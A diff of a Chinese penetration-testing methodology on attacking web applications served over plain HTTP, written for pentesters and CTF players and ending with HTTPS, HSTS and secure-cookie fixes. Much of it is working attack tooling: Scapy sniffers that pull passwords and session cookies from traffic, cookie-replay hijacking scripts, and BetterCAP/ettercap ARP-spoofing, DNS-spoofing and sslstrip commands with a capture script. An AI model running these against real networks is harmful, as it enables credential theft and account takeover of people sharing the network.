@@ -1,617 +1,546 @@
-# HTTP-only 部署攻击
+# HTTP-only 部署攻击方法论
 
-## 1. 方法论概述
+## 1. 文档概述
 
 ### 1.1 编写目的
-本方法论指导渗透测试人员识别和利用仅使用 HTTP（无 HTTPS/TLS）部署的 Web 应用的安全问题，包括会话劫持、凭证拦截和中间人攻击。
+本方法论旨在为渗透测试人员提供针对**仅 HTTP 部署而无 HTTPS/TLS 加密的 Web 应用**进行攻击的标准化流程。重点讲解如何利用明文传输缺陷进行流量嗅探、凭证拦截和会话劫持攻击。
 
 ### 1.2 适用范围
-- 仅监听 HTTP 端口（80）的应用
-- 无 HTTPS 重定向配置
-- 缺少 HSTS 响应头
-- Cookie 缺少 Secure 标志
+- 适用于仅监听 HTTP 端口（80、8080 等）而无 HTTPS 配置的 Web 应用
+- 适用于缺少 HSTS 响应头的 Web 应用
+- 适用于 Cookie 缺少 Secure 标志的会话管理
+- 适用于 Flask、Django、FastAPI 等 Python Web 框架应用
+- 适用于 Docker 容器化部署的 Web 应用
 
 ### 1.3 读者对象
-- 渗透测试工程师
-- 网络安全的测试人员
-- 红队成员
+- 执行渗透测试的安全工程师
+- 进行网络分层的攻击评估人员
+- CTF 参赛选手
+- 应用安全研究人员
 
 ---
 
-## 2. 技术原理
+## 2. 技术专题：HTTP-only 部署攻击
 
-### 2.1 HTTP-only 部署风险
+### 2.1 技术介绍
 
-**风险链：**
-```
-仅 HTTP 部署
-    ↓
-无 TLS 加密
-    ↓
-所有流量明文传输
-    ↓
-网络攻击者可嗅探
-    ↓
-会话 Cookie/凭证泄露
-```
+**漏洞原理：**
+当 Web 应用仅通过 HTTP（明文）协议部署而无 HTTPS/TLS 加密时：
+1. 所有网络流量以明文形式传输
+2. 攻击者可在同一网络中嗅探HTTP 流量
+3. 凭证、会话 Cookie、敏感数据可被截获
+4. 可实施中间人（MITM）攻击注入恶意内容
 
-### 2.2 典型配置问题
+**本质：**
+- **传输层面**：缺乏 TLS/SSL 加密层，数据明文传输
+- **配置层面**：未配置 HTTPS 重定向、HSTS 等安全机制
+- **会话层面**：Cookie 缺少 Secure 标志，可通过 HTTP 传输
 
-**Flask 配置：**
+**技术特征：**
 ```python
-# ❌ 不安全配置
-app.run(host='0.0.0.0', port=80)  # 仅 HTTP
-
-# 缺少安全配置
-# SESSION_COOKIE_SECURE = False  # 允许 HTTP 传输 Cookie
-# 无 HSTS 头
-# 无 HTTPS 重定向
-```
-
-**响应头缺失：**
-```
-# ❌ 不安全的响应头
-HTTP/1.1 200 OK
-Server: Werkzeug/3.0.6 Python/3.8.20
-Set-Cookie: session=abc123; HttpOnly; Path=/
-# Missing: Strict-Transport-Security
-# Missing: Secure flag on cookie
-```
-
-### 2.3 攻击面
-
-**可拦截的数据：**
-- 会话 Cookie
-- 认证凭证（用户名/密码）
-- CSRF Token
-- 敏感 API 请求/响应
-- 用户输入数据
-
----
-
-## 3. 攻击场景
-
-### 3.1 场景 1：会话 Cookie 劫持
-
-**目标：** 窃取受害者会话 Cookie
-
-**前置条件：**
-- 攻击者与受害者在同一网络（WiFi、LAN）
-- 应用仅使用 HTTP
+# Flask 应用 HTTP-only 部署特征
+- app.run(debug=True) 无 SSL 上下文
+- 无 ssl_context 配置
+- 无 HTTPS 重定向中间件
+- 无 HSTS 响应头配置
 - Cookie 无 Secure 标志
 
-**攻击步骤：**
-
-1. **网络嗅探设置**
-   ```bash
-   # 使用 tcpdump 捕获流量
-   tcpdump -i wlan0 -s 0 -w capture.pcap port 80
-   
-   # 或使用 Wireshark
-   wireshark -i wlan0
-   ```
-
-2. **提取会话 Cookie**
-   ```bash
-   # 从捕获文件中提取 Cookie
-   tshark -r capture.pcap -Y "http.cookie" \
-     -T fields -e http.cookie
-   ```
-
-3. **使用窃取的 Cookie**
-   ```bash
-   curl -H "Cookie: session=STOLEN_VALUE" \
-     http://target/admin
-   ```
-
-### 3.2 场景 2：中间人攻击
-
-**目标：** 拦截并修改 HTTP 流量
-
-**工具：** BetterCAP、Ettercap
-
-**BetterCAP 攻击步骤：**
-
-1. **启动 BetterCAP**
-   ```bash
-   bettercap -iface wlan0
-   ```
-
-2. **启用 HTTP 嗅探**
-   ```
-   bettercap> net.show
-   bettercap> set http.proxy.sslstrip true
-   bettercap> http.proxy on
-   ```
-
-3. **执行 ARP 欺骗**
-   ```
-   bettercap> arp.spoof on
-   ```
-
-4. **监控流量**
-   ```
-   bettercap> events.stream
-   ```
-
-### 3.3 场景 3：凭证拦截
-
-**目标：** 窃取登录凭证
-
-**攻击流程：**
-```
-受害者 → POST /login (HTTP)
-       ↓
-攻击者嗅探
-       ↓
-提取 username/password
-       ↓
-使用凭证登录
+# Docker 配置特征
+- 仅暴露 HTTP 端口（如 38583:5000）
+- 无 HTTPS 端口映射
+- 无反向代理 SSL 终止配置
 ```
 
-**自动化脚本：**
-```python
-#!/usr/bin/env python3
-"""
-HTTP Credential Interceptor
-拦截 HTTP 登录凭证
-"""
+### 2.2 攻击常见于哪些业务场景
 
-from scapy.all import *
-import re
+| 业务场景 | 功能示例 | 风险点描述 |
+|---------|---------|-----------|
+| Flask 开发环境 | app.run(debug=True) | 调试模式开启，无 HTTPS 配置，所有流量明文 |
+| Docker 容器应用 | 单容器部署 | 仅暴露 HTTP 端口，无 SSL 终止代理 |
+| CTF 挑战平台 | 安全培训环境 | 故意设计脆弱，HTTP 明文传输 Flag |
+| 内部管理系统 | 内网 Web 应用 | 认为内网安全而不配置 HTTPS |
+| 快速原型应用 | MVP/POC 环境 | 快速部署忽略安全配置 |
+| IoT 设备 Web 界面 | 设备管理后台 | 嵌入式 Web 服务器无 HTTPS |
 
-def packet_callback(packet):
-    """处理捕获的数据包"""
-    if packet.haslayer(Raw):
-        payload = packet[Raw].load.decode('utf-8', errors='ignore')
-        
-        # 查找登录凭证
-        if 'POST' in payload and ('password' in payload.lower() or 
-                                   'passwd' in payload.lower()):
-            print("[+] Login Request Detected!")
-            print(f"[*] Raw payload:\n{payload}")
-            
-            # 提取凭证
-            username_match = re.search(r'username=([^&]+)', payload)
-            password_match = re.search(r'password=([^&]+)', payload)
-            
-            if username_match and password_match:
-                print(f"[+] Username: {username_match.group(1)}")
-                print(f"[+] Password: {password_match.group(1)}")
+### 2.3 漏洞探测方法
 
-def main():
-    print("[*] Starting HTTP credential interceptor...")
-    print("[*] Waiting for login requests...")
-    
-    # 捕获 HTTP 流量（端口 80）
-    sniff(filter="tcp port 80", prn=packet_callback, store=0)
+#### 2.3.1 HTTP-only 部署检测
 
-if __name__ == '__main__':
-    main()
-```
-
----
-
-## 4. 探测与验证
-
-### 4.1 黑盒测试
-
-**步骤 1：检测 HTTP-only 部署**
+**步骤 1：检查端口监听情况**
 ```bash
-# 检查端口监听
-nmap -sV -p 80,443 target
+# 检查目标主机开放端口
+nmap -sV -p- target_host
 
-# 预期结果（不安全）：
-# 80/tcp   open  http
-# 443/tcp  closed https
+# 预期结果（HTTP-only）：
+# 80/tcp    open  http      Caddy httpd
+# 38583/tcp open  http      Flask/Werkzeug
+# 无 443/tcp https 端口
 ```
 
-**步骤 2：检查 HTTPS 重定向**
+**步骤 2：检查 HTTPS 可用性**
 ```bash
-# 测试 HTTP 到 HTTPS 重定向
-curl -I http://target/
+# 尝试 HTTPS 连接
+curl -kI https://target:443/
 
-# 不安全响应（无重定向）：
-# HTTP/1.1 200 OK
-# Server: Werkzeug/3.0.6
-
-# 安全响应（应重定向）：
-# HTTP/1.1 301 Moved Permanently
-# Location: https://target/
+# 预期结果（连接失败或拒绝）：
+# curl: (7) Failed to connect to target port 443: Connection refused
 ```
 
-**步骤 3：检查 HSTS 头**
+**步骤 3：检查 HTTP 响应头**
 ```bash
-curl -I https://target/ 2>/dev/null | grep -i strict
+# 检查 HTTP 响应头
+curl -I http://target:38583/
 
-# 安全配置应有：
-# Strict-Transport-Security: max-age=31536000; includeSubDomains
+# 检查缺失的安全头：
+# - 无 Strict-Transport-Security (HSTS)
+# - 无 HTTPS 重定向
 ```
 
 **步骤 4：检查 Cookie 标志**
 ```bash
 # 检查 Set-Cookie 头
-curl -I http://target/ | grep -i set-cookie
+curl -I http://target:38583/login | grep -i cookie
 
-# 不安全 Cookie：
-# Set-Cookie: session=abc; HttpOnly; Path=/
-# Missing: Secure
-
-# 安全 Cookie：
-# Set-Cookie: session=abc; Secure; HttpOnly; SameSite=Lax
+# 预期结果（不安全配置）：
+# Set-Cookie: session=abc123; Path=/
+# 缺少 Secure 标志
+# 缺少 HttpOnly 标志
+# 缺少 SameSite 标志
 ```
 
-### 4.2 白盒测试
+#### 2.3.2 代码审计检测
 
-**代码审计检查点：**
-
+**Flask 应用检测：**
 ```python
-# 查找 HTTP-only 配置
-grep -rn "app.run" .
-grep -rn "port.*80" .
-grep -rn "SESSION_COOKIE_SECURE" .
+# 搜索 SSL/TLS 配置
+grep -rn "ssl_context\|https\|certfile\|keyfile" /src/
 
-# 危险模式
-app.run(host='0.0.0.0', port=80)  # ❌ 仅 HTTP
+# 搜索 HSTS 配置
+grep -rn "Strict-Transport-Security\|HSTS" /src/
 
-# 安全模式
-app.config['SESSION_COOKIE_SECURE'] = True  # ✅
+# 搜索 Secure Cookie 配置
+grep -rn "SESSION_COOKIE_SECURE\|SESSION_COOKIE_HTTPONLY" /src/
+
+# 预期结果（HTTP-only 部署）：无匹配或配置为 False
 ```
 
-**配置检查：**
-```python
-# ❌ 不安全配置
-app.run(debug=False, host='0.0.0.0', port=80)
-
-# ✅ 安全配置
-app.config.update(
-    SESSION_COOKIE_SECURE=True,      # 仅 HTTPS 传输
-    SESSION_COOKIE_HTTPONLY=True,    # 防止 XSS 窃取
-    SESSION_COOKIE_SAMESITE='Lax',   # 防止 CSRF
-)
-```
-
----
-
-## 5. 利用方法
-
-### 5.1 网络嗅探脚本
-
-**完整利用工具：**
-```python
-#!/usr/bin/env python3
-"""
-HTTP Traffic Interceptor
-HTTP 流量拦截工具
-"""
-
-from scapy.all import *
-import re
-from urllib.parse import unquote
-
-class HTTPInterceptor:
-    def __init__(self, interface='wlan0'):
-        self.interface = interface
-        self.sessions = {}
-        
-    def analyze_packet(self, packet):
-        """分析数据包"""
-        if packet.haslayer(Raw):
-            try:
-                payload = packet[Raw].load.decode('utf-8', errors='ignore')
-                
-                # 分析 HTTP 请求
-                if 'HTTP/' in payload and 'GET' in payload or 'POST' in payload:
-                    self.analyze_http_request(payload, packet)
-                    
-                # 分析 HTTP 响应
-                if 'HTTP/' in payload and 'Set-Cookie' in payload:
-                    self.analyze_http_response(payload, packet)
-                    
-            except Exception as e:
-                pass
-    
-    def analyze_http_request(self, payload, packet):
-        """分析 HTTP 请求"""
-        # 提取 Cookie
-        cookie_match = re.search(r'Cookie:\s*([^\r\n]+)', payload)
-        if cookie_match:
-            src_ip = packet[IP].src
-            cookie = cookie_match.group(1)
-            
-            if src_ip not in self.sessions or \
-               self.sessions[src_ip] != cookie:
-                print(f"\n[+] New Session from {src_ip}")
-                print(f"    Cookie: {cookie}")
-                self.sessions[src_ip] = cookie
-        
-        # 提取 POST 数据
-        if 'POST' in payload:
-            # 查找请求体
-            parts = payload.split('\r\n\r\n', 1)
-            if len(parts) > 1:
-                body = unquote(parts[1])
-                
-                # 查找敏感字段
-                sensitive_fields = ['password', 'passwd', 'pwd', 
-                                   'token', 'secret', 'key', 'flag']
-                
-                for field in sensitive_fields:
-                    if field in body.lower():
-                        print(f"\n[+] Sensitive Data Detected!")
-                        print(f"    Field: {field}")
-                        print(f"    Body: {body[:200]}")
-    
-    def analyze_http_response(self, payload, packet):
-        """分析 HTTP 响应"""
-        # 提取 Set-Cookie
-        cookie_matches = re.findall(r'Set-Cookie:\s*([^\r\n]+)', payload)
-        for cookie in cookie_matches:
-            print(f"\n[+] Set-Cookie Detected!")
-            print(f"    Cookie: {cookie}")
-            
-            # 检查安全标志
-            if 'Secure' not in cookie:
-                print(f"    ⚠️  WARNING: Missing Secure flag!")
-            if 'HttpOnly' not in cookie:
-                print(f"    ⚠️  WARNING: Missing HttpOnly flag!")
-            if 'SameSite' not in cookie:
-                print(f"    ⚠️  WARNING: Missing SameSite flag!")
-    
-    def start(self):
-        """开始拦截"""
-        print(f"[*] Starting HTTP interceptor on {self.interface}...")
-        print("[*] Capturing traffic on port 80...")
-        print("[*] Press Ctrl+C to stop")
-        
-        try:
-            sniff(
-                iface=self.interface,
-                filter="tcp port 80",
-                prn=self.analyze_packet,
-                store=0
-            )
-        except KeyboardInterrupt:
-            print("\n[*] Stopped")
-            print(f"[*] Total sessions captured: {len(self.sessions)}")
-
-def main():
-    import argparse
-    
-    parser = argparse.ArgumentParser(description='HTTP Traffic Interceptor')
-    parser.add_argument('-i', '--interface', default='wlan0',
-                        help='Network interface')
-    
-    args = parser.parse_args()
-    
-    interceptor = HTTPInterceptor(args.interface)
-    interceptor.start()
-
-if __name__ == '__main__':
-    main()
-```
-
-**使用示例：**
+**Docker 配置检测：**
 ```bash
-# 在 WiFi 接口上拦截
-python3 http_interceptor.py -i wlan0
+# 检查 docker-compose.yml
+grep -A5 "ports:" docker-compose.yml
 
-# 在以太网接口上拦截
-python3 http_interceptor.py -i eth0
+# 预期结果（HTTP-only）：
+# ports:
+#   - "38583:5000"  # 仅 HTTP 端口
+# 无 443 端口映射
 ```
 
-### 5.2 会话劫持验证
+#### 2.3.3 网络位置评估
 
-**验证脚本：**
+**攻击者网络位置评估：**
+```bash
+# 检查是否与目标在同一网络
+ip addr show
+
+# 检查 ARP 表
+arp -a
+
+# 检查是否可以嗅探目标流量
+# 需要以下条件之一：
+# 1. 同一 WiFi 网络
+# 2. 同一交换机（可 ARP 欺骗）
+# 3. 网关/路由器位置
+# 4. ISP 级别访问
+```
+
+### 2.4 漏洞利用方法
+
+#### 2.4.1 被动流量嗅探
+
+**工具 1：Wireshark 图形化嗅探**
+```bash
+# 启动 Wireshark（需要 GUI）
+wireshark &
+
+# 或使用 tshark 命令行
+tshark -i eth0 -f "port 38583" -w capture.pcap
+
+# 过滤 HTTP 流量
+tshark -r capture.pcap -Y "http.request.method == POST"
+
+# 提取 POST 数据
+tshark -r capture.pcap -Y "http.request.method == POST" \
+  -T fields -e http.file_data
+```
+
+**工具 2：tcpdump 命令行嗅探**
+```bash
+# 捕获目标端口流量
+sudo tcpdump -i eth0 -s 0 -w http_traffic.pcap port 38583
+
+# 实时查看 HTTP 请求
+sudo tcpdump -i eth0 -s 0 -A port 38583 | grep -E "POST|GET|Cookie|password"
+
+# 提取明文凭证
+sudo tcpdump -i eth0 -s 0 -A port 38583 | grep -E "username|password"
+```
+
+**工具 3：ettercap ARP 欺骗 + 嗅探**
+```bash
+# ARP 欺骗中间人攻击
+sudo ettercap -T -q -i eth0 -M arp:remote /target_ip// /gateway_ip//
+
+# 在另一个终端嗅探
+sudo tcpdump -i eth0 -s 0 -A port 80 | grep -E "POST|Cookie"
+```
+
+#### 2.4.2 凭证拦截攻击
+
+**场景 1：登录凭证截获**
+
 ```python
 #!/usr/bin/env python3
 """
-Session Hijacking Verification
-验证窃取的会话 Cookie 是否有效
+HTTP 流量凭证拦截脚本
+解析捕获的 PCAP 文件提取登录凭证
+"""
+
+from scapy.all import rdpcap, TCP, Raw
+import re
+
+def extract_credentials(pcap_file):
+    """从 PCAP 文件提取凭证"""
+
+    packets = rdpcap(pcap_file)
+    credentials = []
+
+    for packet in packets:
+        if TCP in packet and Raw in packet:
+            payload = packet[Raw].load.decode('utf-8', errors='ignore')
+
+            # 检测登录请求
+            if 'POST' in payload and ('login' in payload.lower() or 'password' in payload.lower()):
+                # 提取用户名
+                username_match = re.search(r'username=([^&]*)', payload)
+                password_match = re.search(r'password=([^&]*)', payload)
+
+                if username_match and password_match:
+                    username = username_match.group(1)
+                    password = password_match.group(1)
+
+                    # URL 解码
+                    from urllib.parse import unquote
+                    username = unquote(username)
+                    password = unquote(password)
+
+                    credentials.append({
+                        'username': username,
+                        'password': password,
+                        'src_ip': packet['IP'].src,
+                        'dst_ip': packet['IP'].dst
+                    })
+
+                    print(f"[+] Captured credentials:")
+                    print(f"    Username: {username}")
+                    print(f"    Password: {password}")
+                    print(f"    Source IP: {packet['IP'].src}")
+
+    return credentials
+
+if __name__ == "__main__":
+    extract_credentials("http_traffic.pcap")
+```
+
+**场景 2：会话 Cookie 截获**
+
+```python
+#!/usr/bin/env python3
+"""
+HTTP 会话 Cookie 拦截脚本
+"""
+
+from scapy.all import rdpcap, TCP, Raw
+import re
+
+def extract_session_cookies(pcap_file):
+    """从 PCAP 文件提取会话 Cookie"""
+
+    packets = rdpcap(pcap_file)
+    sessions = []
+
+    for packet in packets:
+        if TCP in packet and Raw in packet:
+            payload = packet[Raw].load.decode('utf-8', errors='ignore')
+
+            # 检测 Set-Cookie 响应
+            if 'Set-Cookie:' in payload:
+                cookie_match = re.search(r'Set-Cookie:\s*([^\r\n]+)', payload)
+                if cookie_match:
+                    cookie = cookie_match.group(1)
+                    sessions.append({
+                        'cookie': cookie,
+                        'src_ip': packet['IP'].src,
+                        'dst_ip': packet['IP'].dst
+                    })
+
+                    print(f"[+] Captured session cookie:")
+                    print(f"    Cookie: {cookie}")
+                    print(f"    Server IP: {packet['IP'].src}")
+
+            # 检测请求中的 Cookie
+            elif 'Cookie:' in payload:
+                cookie_match = re.search(r'Cookie:\s*([^\r\n]+)', payload)
+                if cookie_match:
+                    cookie = cookie_match.group(1)
+                    print(f"[+] Request with session cookie:")
+                    print(f"    Cookie: {cookie}")
+
+    return sessions
+
+if __name__ == "__main__":
+    extract_session_cookies("http_traffic.pcap")
+```
+
+#### 2.4.3 会话劫持攻击
+
+**使用截获的 Cookie 进行会话劫持：**
+```bash
+#!/bin/bash
+# 会话劫持攻击脚本
+
+# 假设已截获会话 Cookie
+SESSION_COOKIE="session=abc123def456"
+TARGET_URL="http://target:38583/dashboard"
+
+# 使用截获的 Cookie 访问受保护页面
+curl -v "$TARGET_URL" \
+  -H "Cookie: $SESSION_COOKIE" \
+  -H "User-Agent: Mozilla/5.0"
+
+# 如果成功，将访问到受害用户的账户
+```
+
+**Python 会话劫持：**
+```python
+#!/usr/bin/env python3
+"""
+会话劫持攻击脚本
+使用截获的 Cookie 冒充用户
 """
 
 import requests
 
-def verify_session(target, cookie):
-    """验证会话 Cookie"""
+def session_hijacking(target_url, session_cookie):
+    """使用截获的会话 Cookie 访问目标"""
+
+    headers = {
+        'Cookie': session_cookie,
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
+    }
+
     session = requests.Session()
-    session.cookies.set('session', cookie)
-    
-    response = session.get(f"{target}/")
-    
+    session.headers.update(headers)
+
+    # 访问受保护页面
+    response = session.get(target_url)
+
     if response.status_code == 200:
-        print(f"[+] Session Valid!")
+        print("[+] Session hijacking successful!")
         print(f"    Response length: {len(response.text)}")
-        
-        # 检查是否是管理员会话
-        if 'admin' in response.text.lower():
-            print(f"[+] Admin Session Detected!")
-        
-        return True
-    return False
 
-def main():
-    import argparse
-    
-    parser = argparse.ArgumentParser()
-    parser.add_argument('target', help='Target URL')
-    parser.add_argument('cookie', help='Session cookie value')
-    
-    args = parser.parse_args()
-    
-    if verify_session(args.target, args.cookie):
-        print(f"\n[*] Use with curl:")
-        print(f'    curl -H "Cookie: session={args.cookie}" {args.target}/')
+        # 检查是否访问到用户数据
+        if 'Welcome' in response.text or 'Dashboard' in response.text:
+            print("[+] Accessed user dashboard")
+
+        return response
     else:
-        print("[-] Session Invalid")
+        print(f"[-] Session hijacking failed: HTTP {response.status_code}")
+        return None
 
+if __name__ == "__main__":
+    # 使用截获的 Cookie
+    stolen_cookie = "session=abc123def456"
+    session_hijacking("http://target:38583/dashboard", stolen_cookie)
+```
+
+#### 2.4.4 中间人攻击（MITM）
+
+**工具：BetterCAP 中间人攻击**
+```bash
+# 启动 BetterCAP
+sudo bettercap -iface eth0
+
+# BetterCAP 交互命令
+> net.show  # 显示网络设备
+> set arp.spoof.targets 192.168.1.100  # 设置目标
+> arp.spoof on  # 启用 ARP 欺骗
+> http.proxy on  # 启用 HTTP 代理
+> http.proxy.script js_capture.js  # 加载数据捕获脚本
+```
+
+**BetterCAP 数据捕获脚本：**
+```javascript
+// js_capture.js - BetterCAP 捕获脚本
+function onRequest(req, res) {
+    // 记录所有 HTTP 请求
+    console.log("[HTTP] " + req.Method + " " + req.Url);
+
+    // 捕获 POST 数据
+    if (req.Method == "POST") {
+        console.log("[POST DATA] " + req.Body);
+    }
+
+    // 捕获 Cookie
+    if (req.Headers["Cookie"]) {
+        console.log("[COOKIE] " + req.Headers["Cookie"]);
+    }
+}
+
+function OnResponse(req, res) {
+    // 记录响应
+    console.log("[RESPONSE] " + res.StatusCode);
+}
+```
+
+### 2.5 漏洞利用绕过方法
+
+#### 2.5.1 绕过网络隔离
+
+**远程攻击场景：**
+```
+如果无法直接嗅探目标流量（不在同一网络），可考虑：
+
+1. 社会工程学攻击
+   - 诱导用户连接恶意 WiFi
+   - 设置同名 WiFi（Evil Twin）
+
+2. 入侵网络设备
+   - 攻陷路由器/交换机
+   - 配置端口镜像
+
+3. 利用 SSRF
+   - 通过 SSRF 访问内部服务
+   - 结合 HTTP-only 内部应用
+```
+
+#### 2.5.2 绕过 HTTPS 重定向
+
+**如果应用配置了 HTTPS 重定向：**
+```bash
+# 检查是否存在 HSTS
+curl -I https://target/ | grep -i strict
+
+# 如果无 HSTS，可尝试 SSL 剥离攻击
+sslstrip -l 8080 -w capture.log
+
+# 或使用 BetterCAP
+> https.proxy on
+> https.proxy.intercept on
+```
+
+---
+
+## 3. 附录
+
+### 3.1 常用攻击工具速查表
+
+| 工具名称 | 用途 | 使用示例 |
+|---------|------|---------|
+| Wireshark | 网络协议分析 | `wireshark -i eth0` |
+| tcpdump | 命令行抓包 | `tcpdump -i eth0 -w capture.pcap` |
+| tshark | 命令行 Wireshark | `tshark -r capture.pcap -Y http` |
+| Ettercap | ARP 欺骗 + 嗅探 | `ettercap -T -M arp` |
+| BetterCAP | 中间人攻击框架 | `bettercap -iface eth0` |
+| sslstrip | SSL 剥离攻击 | `sslstrip -l 8080` |
+| Scapy (Python) | 数据包处理 | `from scapy.all import *` |
+| Burp Suite | Web 代理 + 嗅探 | Proxy → HTTP history |
+
+### 3.2 HTTP-only 部署检测清单
+
+| 检测项 | 检测方法 | 不安全标志 |
+|-------|---------|-----------|
+| HTTPS 端口 | nmap 扫描 | 无 443 端口开放 |
+| HTTPS 连接 | curl 测试 | 连接被拒绝 |
+| HSTS 响应头 | curl -I 检查 | 无 Strict-Transport-Security |
+| HTTPS 重定向 | 访问 HTTP 观察 | 无 301/302 到 HTTPS |
+| Cookie Secure 标志 | 检查 Set-Cookie | 缺少 Secure 属性 |
+| Flask SSL 配置 | 代码审计 | 无 ssl_context 配置 |
+| Docker 端口映射 | 检查 docker-compose.yml | 仅 HTTP 端口映射 |
+
+### 3.3 防御建议
+
+**配置 HTTPS：**
+```python
+# Flask 应用配置 HTTPS
+from flask import Flask
+
+app = Flask(__name__)
+
+# 方法 1：使用 SSL 上下文
 if __name__ == '__main__':
-    main()
+    app.run(
+        ssl_context=('cert.pem', 'key.pem'),
+        host='0.0.0.0',
+        port=443
+    )
+
+# 方法 2：使用 adhoc 证书（仅开发）
+if __name__ == '__main__':
+    app.run(ssl_context='adhoc')
 ```
 
----
-
-## 6. 绕过技巧
-
-### 6.1 绕过网络隔离
-
-**VLAN 跳跃攻击：**
-```bash
-# 使用 Yersinia 进行 VLAN 攻击
-yersinia -G
-# 选择 VLAN hopping 攻击
-```
-
-### 6.2 ARP 欺骗增强
-
-**使用 BetterCAP 进行 ARP 欺骗：**
-```bash
-bettercap -iface wlan0
-
-# 在 bettercap 交互界面
-bettercap> set arp.spoof.targets 192.168.1.100
-bettercap> arp.spoof on
-bettercap> net.sniff on
-```
-
-### 6.3 DNS 欺骗
-
-**配合 HTTP 拦截：**
-```bash
-bettercap> set dns.spoof.domains login.target.com
-bettercap> set dns.spoof.address 192.168.1.100
-bettercap> dns.spoof on
-```
-
----
-
-## 7. 影响评估
-
-### 7.1 直接危害
-- 会话 Cookie 窃取
-- 认证凭证拦截
-- 敏感数据泄露
-
-### 7.2 潜在危害
-- 账户完全接管
-- 横向移动到其他系统
-- 敏感业务数据泄露
-
-### 7.3 CVSS 评分参考
-- **基础分数：** 7.5 (High)
-- **攻击向量：** Adjacent (AV:A) - 需要网络位置
-- **攻击复杂度：** Low (AC:L)
-- **权限要求：** None (PR:N)
-- **用户交互：** None (UI:N)
-- **机密性影响：** High (C:H)
-- **完整性影响：** Low (I:L)
-- **可用性影响：** None (A:N)
-
----
-
-## 8. 修复建议
-
-### 8.1 强制 HTTPS
-
-**Nginx 配置：**
-```nginx
-server {
-    listen 80;
-    server_name example.com;
-    
-    # 重定向所有 HTTP 到 HTTPS
-    return 301 https://$server_name$request_uri;
-}
-
-server {
-    listen 443 ssl http2;
-    server_name example.com;
-    
-    ssl_certificate /path/to/cert.pem;
-    ssl_certificate_key /path/to/key.pem;
-    
-    # HSTS
-    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
-}
-```
-
-### 8.2 Flask 安全配置
-
+**配置 HSTS：**
 ```python
-# 安全配置
-app.config.update(
-    SESSION_COOKIE_SECURE=True,      # 仅 HTTPS
-    SESSION_COOKIE_HTTPONLY=True,    # 防止 XSS
-    SESSION_COOKIE_SAMESITE='Lax',   # 防止 CSRF
-)
-
-# 强制 HTTPS（在代理后）
-@app.before_request
-def force_https():
-    if not request.is_secure:
-        url = request.url.replace('http://', 'https://', 1)
-        return redirect(url, code=301)
-```
-
-### 8.3 安全响应头
-
-```python
+# Flask 添加 HSTS 响应头
 @app.after_request
 def add_security_headers(response):
     response.headers['Strict-Transport-Security'] = \
         'max-age=31536000; includeSubDomains'
-    response.headers['X-Content-Type-Options'] = 'nosniff'
     response.headers['X-Frame-Options'] = 'DENY'
-    response.headers['X-XSS-Protection'] = '1; mode=block'
-    response.headers['Content-Security-Policy'] = \
-        "default-src 'self'"
+    response.headers['X-Content-Type-Options'] = 'nosniff'
     return response
 ```
 
----
-
-## 9. 参考资源
-
-- [OWASP Transport Layer Protection Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html)
-- [OWASP HTTP Strict Transport Security](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html)
-- [BetterCAP Documentation](https://www.bettercap.org/)
-
----
-
-## 10. 实战案例
-
-### 10.1 CTF 挑战案例
-
-**目标：** Flask Markdown 转换器（端口 42369）
-
-**发现：**
-```bash
-curl -I http://localhost:42369/
-
-# 响应：
-# Server: Werkzeug/3.0.6 Python/3.8.20
-# Set-Cookie: session=abc; HttpOnly; Path=/
-# Missing: Secure, HSTS
+**配置 Secure Cookie：**
+```python
+# Flask 安全 Cookie 配置
+app.config['SESSION_COOKIE_SECURE'] = True  # 仅 HTTPS 传输
+app.config['SESSION_COOKIE_HTTPONLY'] = True  # 禁止 JavaScript 访问
+app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'  # CSRF 防护
 ```
 
-**利用：**
-```bash
-# 网络嗅探
-python3 http_interceptor.py -i wlan0
+**使用反向代理：**
+```yaml
+# docker-compose.yml 配置 Caddy 反向代理
+version: '3'
+services:
+  caddy:
+    image: caddy:2
+    ports:
+      - "80:80"
+      - "443:443"
+    volumes:
+      - ./Caddyfile:/etc/caddy/Caddyfile
+      - caddy_data:/data
 
-# 捕获会话 Cookie
-# 使用窃取的 Cookie 访问
-curl -H "Cookie: session=STOLEN_VALUE" http://localhost:42369/admin
+  app:
+    build: .
+    expose:
+      - "5000"
+
+volumes:
+  caddy_data:
 ```
 
-### 10.2 生产环境案例
+```
+# Caddyfile 配置
+example.com {
+    reverse_proxy app:5000
+}
+```
 
-**场景：** 内部 Flask 应用
+---
 
-**问题：**
-- 仅 HTTP 部署（端口 80）
-- 无 HSTS 头
-- Cookie 无 Secure 标志
-- 运行在共享 WiFi 网络
-
-**影响：** 攻击者可在同一网络拦截所有会话
+**文档版本：** 1.0
+**最后更新：** 2026 年 3 月
+**适用场景：** 渗透测试、安全评估、CTF 挑战
